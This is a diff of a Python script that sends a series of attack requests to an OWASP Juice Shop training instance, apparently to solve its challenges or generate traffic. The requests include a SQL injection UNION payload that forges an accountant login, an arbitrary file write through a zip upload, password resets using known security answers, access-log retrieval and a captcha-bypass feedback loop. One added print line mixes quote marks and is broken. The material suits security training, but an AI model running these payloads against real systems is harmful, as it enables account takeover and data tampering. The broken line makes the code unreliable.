@@ -8,7 +8,7 @@ url = sys.argv[1]
 import requests
 print("Creating Traffic Against URL: " +  url)
 # ==== No required action ====
-# ---- Arbitrary File Write (Overwrite the Legal Information file.)
+print("---- Arbitrary File Write - Overwrite the Legal Information file.")
 requests.post(url+'/file-upload', files={'file':open('file-upload/Arbitrary File Write.zip','rb')})
 # ---- Access Log (Gain access to any access log file of the server.)
 requests.get(url+'/support/logs/access.log')
@@ -84,7 +84,7 @@ requests.get(url+'/promotion')
 # Removed as system does not have ssl libs
 #requests.get(url+'/redirect?to=http://kimminich.de?pwned=https://github.com/bkimminich/juice-shop')
 
-# ==== No required action - Login challenges ====
+print("==== Login challenges ====')
 # ---- Ephemeral Accountant (Log in with the (non-existing) accountant acc0unt4nt@juice-sh.op without ever registering that user.)
 requests.post(url+'/rest/user/login', data={'email':'\' UNION SELECT * FROM (SELECT 15 as \'id\', \'\' as \'username\', \'acc0unt4nt@juice-sh.op\' as \'email\', \'12345\' as \'password\', \'accounting\' as \'role\', \'1.2.3.4\' as \'lastLoginIp\', \'default.svg\' as \'profileImage\', \'\' as \'totpSecret\', 1 as \'isActive\', \'1999-08-16 14:14:41.644 +00:00\' as \'createdAt\', \'1999-08-16 14:33:41.930 +00:00\' as \'updatedAt\', null as \'deletedAt\')--','password':'a'})
 # ---- GDPR Data Erasure (Log in with Chris' erased user account.)
@@ -108,7 +108,7 @@ requests.post(url+'/rest/user/login', data={'email':'support@juice-sh.op','passw
 # ---- Password Strength (Log in with the administrator's user credentials without previously changing them or applying SQL Injection.)
 # See "Login Admin" in this part
 
-# ==== No required action - Change password challenges ====
+print("==== Change password challenges ====")
 # ---- Bjoern's Favorite Pet (Reset the password of Bjoern's OWASP account via the Forgot Password mechanism with the original answer to his security question.)
 requests.post(url+'/rest/user/reset-password',data={'email':'bjoern@owasp.org','answer':'Zaya','new':'bjoern','repeat':'bjoern'})
 # ---- Reset Bender's Password (Reset Bender's password via the Forgot Password mechanism with the original answer to his security question.)
@@ -123,7 +123,7 @@ requests.post(url+'/rest/user/reset-password',data={'email':'morty@juice-sh.op',
 # ==== Captcha ===
 from json import loads
 captcha=loads(requests.get(url+'/rest/captcha').text)
-# ---- Captcha Bypass (Submit 10 or more customer feedbacks within 10 seconds.)
+print("---- Captcha Bypass (Submit 10 or more customer feedbacks within 10 seconds.")
 for i in range(11):
 	requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'a','rating':3})
 # ---- Forged Feedback (Post some feedback in another users name.)
